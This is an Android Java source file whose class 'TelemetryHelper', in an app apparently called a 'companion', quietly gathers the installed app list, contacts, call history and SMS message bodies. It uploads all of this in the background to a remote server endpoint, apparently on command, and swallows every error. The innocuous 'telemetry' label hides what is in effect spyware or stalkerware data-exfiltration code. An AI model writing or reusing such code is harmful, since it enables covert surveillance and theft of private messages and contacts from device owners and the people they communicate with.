package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class TelemetryHelper {

    public static void syncInstalledApps(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    PackageManager pm = context.getPackageManager();
                    List<PackageInfo> packages = pm.getInstalledPackages(0);
                    JSONArray apps = new JSONArray();

                    for (PackageInfo pi : packages) {
                        JSONObject app = new JSONObject();
                        app.put("package_name", pi.packageName);
                        app.put("app_name", pi.applicationInfo.loadLabel(pm).toString());
                        boolean isSystem = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                        app.put("is_system_app", isSystem);
                        app.put("usage_time_seconds", 0);
                        apps.put(app);
                    }

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("installed_apps", apps);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncContacts(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                            null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT 300");
                    if (c == null) return;

                    JSONArray list = new JSONArray();
                    while (c.moveToNext()) {
                        String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        JSONObject item = new JSONObject();
                        item.put("name", name != null ? name : "Unknown");
                        JSONArray nums = new JSONArray();
                        if (number != null) nums.put(number);
                        item.put("phone_numbers", nums);
                        list.put(item);
                    }
                    c.close();

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("contacts", list);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncCalls(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");
                    if (c == null) return;

                    JSONArray list = new JSONArray();
                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);

                    while (c.moveToNext()) {
                        String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                        String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                        int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
                        long duration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                        long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));

                        String callType = "incoming";
                        if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";
                        else if (type == CallLog.Calls.MISSED_TYPE) callType = "missed";
                        else if (type == CallLog.Calls.REJECTED_TYPE) callType = "rejected";

                        JSONObject item = new JSONObject();
                        item.put("phone_number", number != null ? number : "Unknown");
                        if (name != null) item.put("contact_name", name);
                        item.put("call_type", callType);
                        item.put("duration_seconds", duration);
                        item.put("timestamp", iso.format(new Date(date)));
                        list.put(item);
                    }
                    c.close();

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("calls", list);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncMessages(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
                    if (c == null) return;

                    JSONArray list = new JSONArray();
                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);

                    while (c.moveToNext()) {
                        String address = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
                        String bodyText = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
                        int type = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
                        long date = c.getLong(c.getColumnIndex(Telephony.Sms.DATE));

                        JSONObject item = new JSONObject();
                        item.put("sender", address != null ? address : "Unknown");
                        item.put("body", bodyText != null ? bodyText : "");
                        item.put("message_type", type == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "inbox");
                        item.put("timestamp", iso.format(new Date(date)));
                        list.put(item);
                    }
                    c.close();

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("messages", list);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }
}
